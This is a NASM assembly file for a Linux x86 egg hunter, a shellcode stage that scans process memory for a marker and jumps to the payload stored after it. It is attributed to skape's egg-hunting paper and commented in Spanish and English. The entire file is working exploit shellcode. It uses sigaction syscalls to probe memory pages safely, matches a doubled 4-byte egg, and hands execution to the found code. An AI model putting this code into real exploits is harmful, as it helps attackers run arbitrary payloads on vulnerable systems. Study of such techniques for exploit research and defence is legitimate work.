; Egg_Hunter.nasm
; NASM code obtain from: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; Author: MrSquid


global _start ;Para definir donde arranca 

section .text

_start: 

alignment:  
	or cx,0xfff         ; Establece el alineamiento de la paginacion

search_shell:  
	inc ecx             ; Increment our page alignment 
	push byte +0x43     ; Sigaction syscall (Mete 67 porque es el numero que se le asigna
	pop eax             ; eax=67
	int 0x80            ; Syscall a sigaction

	cmp al,0xf2         ; Compara la respuesta de sigaction con 242 (error de sigaction)
	jz alignment           ; Si sale que si, vuelve a probar (va mirando por toda la memoria hasta encontrar el huevo)
	mov eax, 0x7A6EA1A2 ; Aqui guardamos el huevo en eax para cuadno se cumpla la condicion
	mov edi, ecx        ; Mete ecx en edi para que apunte a la posicion en memoria donde se encuentra la shell
	scasd   
	jnz search_shell    ; If it did not match try the next address
	scasd
	jnz search_shell
	jmp edi             ; We found our egg identifier, pass execution

